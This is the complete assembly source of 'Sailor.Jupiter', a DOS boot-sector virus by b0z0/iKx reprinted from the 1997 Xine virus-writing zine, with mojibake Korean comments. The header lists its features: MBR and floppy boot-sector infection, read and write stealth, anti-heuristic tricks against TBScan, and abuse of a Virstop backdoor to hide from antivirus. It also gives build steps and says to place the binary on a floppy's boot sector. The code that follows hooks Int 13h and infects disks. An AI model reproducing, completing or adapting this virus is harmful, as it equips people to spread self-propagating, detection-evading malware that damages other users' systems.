;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                                                              CVC #01  97/06
;                          Sailor.Jupiter
;                          **************
;
;  ·¡Ÿq : Sailor.Jupiter
;  ¹A¸b¸a : B0z0 / iKx / 96.09
;
;  ¦…¬â : Osiris of CVC,Corea / 97.04
;                                       /-----------------------------\
;                                Â‰Àá : | Xine - issue #1 - Phile 022 |
;                                       \-----------------------------/
;
; b0z0 presents:
; Sailor.Jupiter
;
; well, boot infectors... it has to be done :) let's see what it does:
;   - infects BS/MBR. Original MBR is on 0,0,2 and original BS on
;     floppyes is on 0,1,14.
;   - MBR stealth on write/read/verify
;   - Floppy BS stealth on read. I haven't implemented floppy BS stealth
;     on write because i think that is a waste of space. infact it gets
;     a lot of space to test all the possible writings to the original
;     bs. and a non complete check will only bring problems. anyway if
;     a user formats the diskette while the virus is in mem it will be
;     infect on the first read, that's the stage when format checks the
;     total space on diskette :)
;   - Heavy antiheuristic structures agains TBScan. the infected boot
;     sectors actually doesn't flag any flag with TBScan 7.04. well, that
;     article on the flags was of use for someone :)
;   - Anti-Virstop feature. This is the first virus, i think, that uses
;     the Virstop backdoor, so the AV won't notice the infected boot
;     sector when a user read an infected diskette. Thanx Dandler!
;
;
; Once again thanx to Dandler for his help with my first boot experience :)
;
;
; To compile:
;  TASM /ZI /M2 JUPITER.ASM
;  TLINK /M /V JUPITER.OBJ
;  TDSTRIP -C JUPITER.EXE
; and then put the resulting file at the boot sector of a floppy disk.
; pay attention, you must of course preserve the first 03eh bytes of the
; original boot sector
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

.model tiny
.code

        org     0

start:
        jmp     short virus_start
        nop
                                        ; Ïi¡Ï¡ —¡¯aÇa· BPB ¶w·¡ —i´áˆq
        org     03eh

virus_start:
        cli
        xor     ax,ax
        mov     ss,ax                   ; SS,SP ¬é¸÷
        mov     sp,7c00h
        push    ax
        pop     es
        push    ax                      ; ES = 0
        pop     ds                      ; DS = 0
        sti

        mov     ax,201h                 ; ¤a·¡œá¯a –õ¦¦…µA MBR ·ª‹¡
        mov     bx,offset virus_end+7c00h
        mov     dx,80h
        mov     cx,1
        int     13h                     ; MBR ·ª‹¡
        jc      no_mbr                  ; Ða—a —¡¯aÇaˆa ´ôa ?

        mov     si,offset virus_name+7c00h
        push    si
        pop     di
        add     di,offset virus_end
        mov     cx,7
        rep     cmpsw                   ; ˆqµq µa¦ ˆñ¬a
        je      no_mbr

        mov     byte ptr floppymarker+7c00h,1   ;HD mark
        mov     ax,202h
        inc     ah
        mov     bx,7c00h
        mov     cx,1                    ; ¤a·¡œá¯a µÁ ¶¥œ MBR ³a‹¡
        int     13h

        mov     byte ptr floppymarker+7c00h,0   ; Ïi¡Ï¡ —¡¯aÇa¡ ­AË·

no_mbr:
        mov     di,412h                 ; TBSCAN ­¢·¡‹¡
        inc     di                      ; 0:413h
        dec     word ptr ds:[di]
        mov     ax,word ptr ds:[di]
        mov     cl,6
        shl     ax,cl                   ; ¬w¶á µwµb º­¡ˆt ´è‹¡
        mov     es,ax

        xchg    word ptr ds:[04eh],ax   ; Int 13h ˆa¡À‹¡
        mov     seg13h+7c00h,ax         ; µ•i Int 13h ­A‹a åËa ¸á¸w
        mov     ax,offset int13h_handler; ax=¤a·¡œá¯a Int 13h
        xchg    word ptr ds:[04ch],ax
        mov     off13h+7c00h,ax         ; µ•i Int 13h µ¡Ïa­U ¸á¸w

        mov     si,100h                 ;
        push    si                      ; TBSCAN· O flag ¹Aˆá
        pop     cx                      ; mov cx,100h
        mov     si,7C00h                ; mov si,7c00h ¯¡ O Ïiœ‹a
        push    si
        xor     di,di
        rep     movsw                   ; ¤a·¡œá¯a ¥¢¬a

        push    cs
        pop     es                      ; ES=CS

        mov     ax,201h                 ; 0:7c00h µA ¶¥œ ¦Ëa ­BÈá ·ª‹¡
        pop     bx
        mov     cx,1
        cmp     byte ptr cs:[floppymarker+7c00h],0  ; Ða—a ? Ïi¡Ï¡ ?
        jne     isharddisk              ; 0 : Ïi¡Ï¡
        mov     cx,000eh                ; 1 : Ða—a—¡¯aÇa
        mov     dl,0
        mov     dh,1

isharddisk:
        push    013cdh                  ; put CD13 at 7c00h-2 (Int 13h)
        jmp     start-2                 ; ¸¦Ë·

;
;
;
int13h_handler:
        cmp     cx,1                    ; ¦Ëa ­BÈáŸi ·ª·aa‰¡ Ðaa ?
        jne     do_int_13
        cmp     dh,0                    ;
        jne     do_int_13
        cmp     dl,80h                  ; Ða—a —¡¯aÇa ?
        je      mbr_stealth
        cmp     dl,1                    ; Ïi¡Ï¡· ¦Ëa ­BÈáŸi ·ª·aa‰¡ Ðaa ?
        ja      do_int_13
        cmp     ax,201h                 ; 1 ­BÈá ·ª‹¡ ·¥ˆa ?
        je      floppy_infection
do_int_13:
        db      0EAh                    ; ¶¥œ Int 13h ¡ ¸ñÏa
off13h   dw      ?
seg13h   dw      ?

mbr_stealth:
        push    cx                      ; º¦Ëa­BÈá ¯aÉI¯a
        mov     cl,2
        int     13h                     ; ¶¥œ MBR ·i ”¯¥ ¥¡µaº…”a.
        pop     cx                      ;
        retf    2

floppy_infection:
        pushf                           ; ·ª‹¡ ®Ð—
        call    dword ptr cs:off13h
        jc      read_error
        pushf
        push    ax
        push    bx
        push    cx
        push    si
        push    di
        push    ds
        push    es

        push    es
        pop     ds
        push    cs
        pop     es

        lea     si,[offset virus_name + bx]
        mov     di,offset virus_name
        mov     cx,7
        rep     cmpsw
        je      fbs_stealth             ; ˆqµqµa¦ ÑÂ·¥

        push    es
        push    dx
        push    ds
        pop     es
        mov     ax,201h                 ; ¶¥œ ¦Ëa ­BÈá ¸á¸w
        push    ax
        inc     ah
        mov     cx,000eh                ; 0 Ëaœ‚ 14 ­BÈá
        mov     dh,01h                  ; 1 ÑA—a
        int     13h                     ; ®Ð— !
        pop     ax

        pop     dx
        pop     es
        jc      fb_exit                 ; µAœá ?

        mov     byte ptr cs:[floppymarker],0
        lea     si,[bx+03h]             ; BPB ¶w ¸á¸w
        mov     di,03h                  ;
        mov     cx,03bh
        rep     movsb

        mov     word ptr es:[2fh],10cdh ; Virstop rulesss ]:)

        push    bx
        inc     ah                      ; ³a‹¡ (AH=3)
        sub     bx,bx                   ; mov    BX,offset START
        mov     cx,1
        int     13h                     ; Ïi¡Ï¡ ¦Ëa ­BÈá ³a‹¡
        pop     bx

fbs_stealth:                            ; FBS ¯aÉI¯a
        push    ds
        pop     es
        mov     ax,201h
        mov     cx,000eh                ;
        mov     dh,01h                  ;
        int     13h                     ;

fb_exit:
        pop     es
        pop     bx
        pop     di
        pop     si
        pop     cx
        pop     bx
        pop     ax
        popf
read_error:
        retf    2

virus_name      db      'Sailor.Jupiter',0  ; ¤a·¡œá¯a ·¡Ÿq
virus_author    db      'b0z0/iKx',0        ; ¹A¸b¸a

floppymarker db      00h

        org     01feh

boot_mbr:                                   ; ¸÷¬w ¦Ëa ­BÈá ¹·ža Îa¯¡
        db      55h,0AAh

        org     200h

virus_end:

end
